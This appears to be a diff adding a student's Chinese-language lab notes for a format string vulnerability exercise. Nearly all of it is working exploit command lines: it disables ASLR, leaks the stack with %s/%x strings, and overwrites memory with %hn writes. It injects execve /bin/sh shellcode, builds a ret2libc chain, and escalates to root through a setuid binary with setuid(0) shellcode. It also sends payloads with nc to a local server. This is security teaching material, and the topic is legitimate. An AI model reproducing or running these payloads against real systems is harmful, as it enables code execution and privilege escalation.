@@ -1,0 +1,84 @@
+//win+crtl+上箭头
+格式化字符串漏洞实验：
+task1:
+sudo sysctl -w kernel.randomize_va_space=0
+gcc prog1.c -o prog1
+
+1)%s%s%s%s%s
+
+2)%08x %08x %08x %08x %08x %08x %08x 
+
+3)法一：echo $(printf "\x46\xed\xff\xbf\x44\xed\xff\xbf")%26240c%6\$hn%4369c%7\$hn | ./prog1  (注释：hhn：1个字节；hn：2个字节；n：4个字节；lln：8个字节）
+  法二：echo $(printf "\x44\xed\xff\xbf\x46\xed\xff\xbf")%30609c%6\$n%61167c%7\$n | ./prog1
+
+echo $(printf "\x36\xec\xff\xbf\x34\xec\xff\xbf")%26240c%5\$hn%4369c%6$hn | ./prog1
+
+task2：
+sudo sysctl -w kernel.randomize_va_space=0
+
+1）gcc -z execstack -o prog2 prog2.c
+echo $(printf "\x7e\xea\xff\xbf\x7c\xea\xff\xbf\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")%49119c%17\$hn%10909c%18\$hn > badfile  
+解释：将fmtstr的返回地址修改为str+8的地址(shellcode的地址）；*****用打印出的地址*****调试的地址不是真实的地址
+
+2）gcc -z noexecstack -o prog2 prog2.c
+//system:0xb7da4da0
+//exit:0xb7d989d0
+// /bin/sh:0xbffffe1e
+//ebp:0xbfffecc8
+echo $(printf "\xcc\xec\xff\xbf\xd0\xec\xff\xbf\xd2\xec\xff\xbf\xce\xec\xff\xbf\xd6\xec\xff\xbf\xd4\xec\xff\xbf")%19848c%17\$hn%15408c%18\$hn%11785c%19\$hn%1c%20\$hn%2085c%21\$hn%15903c%22\$hn > badfile
+解释：将fmtstr的返回地址(ebp+4)修改为system的地址，ebp+8修改为exit的地址，ebp+12修改为/bin/sh的地址
+
+3)关闭stack Guard：
+注入shellcode：成功
+ret2libc：成功
+  打开stack Guard：
+注入shellcode：成功
+ret2libc：成功
+
+4）仿照1）
+gcc -z execstack -o prog2 prog2.c
+sudo chown root prog2
+sudo chmod 4755 prog2
+echo $(printf "\xae\xec\xff\xbf\xac\xec\xff\xbf\x31\xc0\x31\xdb\xb0\xd5\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")%49111c%17\$hn%11469c%18\$hn > badfile             //利用setuid(0)，不是符号链接
+
+task3:
+解释：第64个,先运行server(会自动运行format-32)，再用nc命令发送数据
+1)%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
+
+2）echo $(printf "\x28\xbb\x0b\x08")%64\$s > badfile
+   nc 127.0.0.1 9090 < badfile
+   
+3）echo $(printf "\x6a\xb0\x0e\x08\x68\xb0\x0e\x08")%43699c%64\$hn%8738c%65\$hn > badfile
+   nc 127.0.0.1 9090 < badfile
+   
+4) test.py生成badfile
+   nc 127.0.0.1 9090 < badfile
+   
+5)test1.py生成badfile
+nc 127.0.0.1 9090 < badfile | nc -l 7070 -v
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
